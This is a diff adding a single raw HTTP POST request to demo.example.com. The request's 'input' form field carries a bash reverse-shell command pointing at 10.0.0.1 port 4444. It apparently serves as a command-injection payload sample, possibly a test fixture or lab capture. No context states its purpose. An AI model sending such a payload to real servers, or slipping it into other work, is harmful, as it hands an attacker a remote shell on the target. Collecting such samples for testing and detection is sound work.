@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+
+input=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
